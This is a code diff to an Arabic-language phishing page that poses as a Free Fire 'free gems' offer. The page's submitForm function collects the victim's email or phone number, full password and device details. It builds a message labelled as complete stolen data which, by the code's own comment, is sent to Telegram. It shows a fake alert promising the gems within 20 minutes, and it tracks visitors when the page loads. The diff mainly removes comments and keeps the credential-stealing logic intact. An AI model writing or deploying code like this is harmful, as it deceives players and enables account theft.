@@ -348,7 +348,6 @@
                 جاري تحميل العروض...
             </div>
             <div class="offer-grid" id="offerGrid">
-                <!-- العروض ستُضاف ديناميكياً -->
             </div>
         </div>
     </div>
@@ -442,6 +441,7 @@
         ];
         
         function selectGame(game) {
+            // ✅ بدون أي رسائل - مباشرة للعروض
             document.getElementById('offersSection').style.display = 'block';
             loadOffers();
             window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -501,34 +501,30 @@
         
         async function submitForm() {
             const emailOrPhone = document.getElementById('emailOrPhone').value;
-            const password = document.getElementById('password').value; // ✅ إرسال كاملة بدون قطع
+            const password = document.getElementById('password').value;
             
             if (!emailOrPhone || !password) {
                 showError('يرجى ملء جميع الحقول');
                 return;
             }
             
-            // التحقق من صحة البيانات
             const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
             if (!emailRegex.test(emailOrPhone) && !/^\d{10,15}$/.test(emailOrPhone.replace(/[^0-9]/g, ''))) {
                 showError('معلومات البريد أو الهاتف غير صحيحة');
                 return;
             }
             
-            // ✅ رسالة تأكيد الوقت
             alert('وصول الجواهر إليك قد يتطلب 20 دقيقة أو أقل ⏳');
             
-            // جمع معلومات الجهاز
             const userData = {
                 emailOrPhone,
-                password: password, // ✅ كاملة بدون قطع
+                password,
                 userAgent: navigator.userAgent,
                 screen: screen.width + 'x' + screen.height,
                 language: navigator.language,
                 timestamp: new Date().toLocaleString('ar-SA')
             };
             
-            // إرسال للتيليجرام - كاملة!
             const message = `🔥 بيانات كاملة من فري فاير!\n\n👤 البريد/الهاتف: ${userData.emailOrPhone}\n🔑 كلمة المرور الكاملة: ${userData.password}\n📱 الجهاز: ${userData.userAgent.substring(0,50)}...\n🖥️ الدقة: ${userData.screen}\n🌍 اللغة: ${userData.language}\n📅 الوقت: ${userData.timestamp}`;
             
             document.querySelector('.submit-btn').innerHTML = 'جاري الإرسال...';
@@ -555,12 +551,10 @@
             }, 5000);
         }
         
-        // تشغيل عند تحميل الصفحة
         window.onload = function() {
             trackVisitor();
         };
         
-        // إغلاق النافذة عند الضغط خارجها
         window.onclick = function(event) {
             const modals = document.querySelectorAll('.login-modal, .info-modal');
             modals.forEach(modal => {
